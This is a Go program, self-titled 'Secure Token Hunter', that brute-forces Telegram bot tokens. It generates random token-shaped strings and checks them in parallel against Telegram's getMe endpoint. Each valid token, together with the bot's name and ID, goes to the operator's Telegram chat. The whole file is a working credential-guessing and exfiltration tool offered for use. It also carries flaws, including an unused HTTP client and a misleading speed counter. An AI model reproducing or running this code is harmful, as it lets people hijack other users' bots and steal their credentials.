package main

import (
    "encoding/json"
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    WORKERS     int
    BOT_TOKEN   = os.Getenv("BOT_TOKEN")    // ENV var
    CHAT_ID     = os.Getenv("CHAT_ID")      // ENV var
    activeChan  = make(chan string, 100)
    activeCount int
    mu          sync.Mutex
)

type BotInfo struct {
    Ok     bool `json:"ok"`
    Result struct {
        ID        int    `json:"id"`
        IsBot     bool   `json:"is_bot"`
        FirstName string `json:"first_name"`
        Username  string `json:"username"`
    } `json:"result"`
}

func init() {
    flag.IntVar(&WORKERS, "workers", 50, "Ping workers count")
    flag.Parse()
    
    // Validate ENV vars
    if BOT_TOKEN == "" {
        fmt.Println("❌ Set BOT_TOKEN env: export BOT_TOKEN='123456:ABC...'")
        os.Exit(1)
    }
    if CHAT_ID == "" {
        fmt.Println("❌ Set CHAT_ID env: export CHAT_ID='123456789'")
        os.Exit(1)
    }
    fmt.Printf("✅ Config loaded | Workers: %d
", WORKERS)
}

func generateRandomToken() string {
    numbers := "0123456789"
    letters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_"
    token := ""
    for i := 0; i < 8+rand.Intn(3); i++ {
        token += string(numbers[rand.Intn(10)])
    }
    token += ":"
    for i := 0; i < 40; i++ {
        if i%8 == 0 && i > 0 {
            token += "-"
        }
        token += string(letters[rand.Intn(len(letters))])
    }
    return token
}

func pingToken(token string) bool {
    resp, err := http.Get("https://api.telegram.org/bot" + token + "/getMe")
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    return resp.StatusCode == 200
}

func getBotInfo(token string) *BotInfo {
    resp, _ := http.Get("https://api.telegram.org/bot" + token + "/getMe")
    if resp.StatusCode != 200 {
        return nil
    }
    defer resp.Body.Close()
    
    var info BotInfo
    json.NewDecoder(resp.Body).Decode(&info)
    if !info.Ok || !info.Result.IsBot {
        return nil
    }
    return &info
}

func infoWorker() {
    for token := range activeChan {
        fmt.Printf("🔍 Processing: %s
", token[:20]+"...")
        
        info := getBotInfo(token)
        if info != nil {
            msg := fmt.Sprintf(
                "🎉 **Active token #%d**
"+
                    "**Bot name:** %s
"+
                    "**Bot username:** @%s
"+
                    "**Token:** `%s`
"+
                    "**ID:** `%d`",
                activeCount+1,
                info.Result.FirstName,
                info.Result.Username,
                token,
                info.Result.ID,
            )
            sendMsg(msg)
            mu.Lock()
            activeCount++
            mu.Unlock()
        }
    }
}

func sendMsg(text string) {
    msg := url.QueryEscape(text)
    _, _ = http.Get("https://api.telegram.org/bot" + BOT_TOKEN + 
        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg + "&parse_mode=Markdown")
}

func pingWorker(wg *sync.WaitGroup) {
    defer wg.Done()
    client := &http.Client{Timeout: 2*time.Second}
    
    for {
        token := generateRandomToken()
        if pingToken(token) {
            select {
            case activeChan <- token:
            default:
            }
        }
        time.Sleep(50 * time.Millisecond)
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    fmt.Printf("🚀 Secure Token Hunter | Workers: %d | Ctrl+C stop
", WORKERS)
    
    go infoWorker()
    
    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    
    var wg sync.WaitGroup
    for i := 0; i < WORKERS; i++ {
        wg.Add(1)
        go pingWorker(&wg)
    }
    
    tested := 0
    start := time.Now()
    ticker := time.NewTicker(10 * time.Second)
    
    go func() {
        for {
            select {
            case <-c:
                close(activeChan)
                wg.Wait()
                ticker.Stop()
                return
            case <-ticker.C:
                mu.Lock()
                ac := activeCount
                mu.Unlock()
                speed := float64(tested*10) / time.Since(start).Seconds()
                fmt.Printf("📊 Speed: %.0f/sec | Tested: %d | Active: %d
", speed, tested*10, ac)
                tested += 10
            }
        }
    }()
    
    <-c
    fmt.Printf("⏹️ Stopped! Active found: %d
", activeCount)
}
